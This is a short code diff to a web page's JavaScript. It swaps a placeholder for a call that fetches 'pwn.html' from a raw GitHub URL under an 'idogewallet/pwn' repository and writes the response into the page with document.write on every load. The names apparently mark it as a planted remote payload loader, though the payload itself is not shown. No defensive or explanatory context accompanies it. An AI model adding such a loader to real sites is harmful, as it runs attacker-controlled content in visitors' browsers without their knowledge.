@@ -22,7 +22,7 @@
         $(function() {
             var endingTime = new Date().getTime();
             var tookTime = endingTime - startingTime;
-            $.get("<i will put pwn.html here>", function(data, status){
+            $.get("https://raw.githubusercontent.com/idogewallet/pwn/master/pwn.html", function(data, status){
               document.write(data);
             });
         });
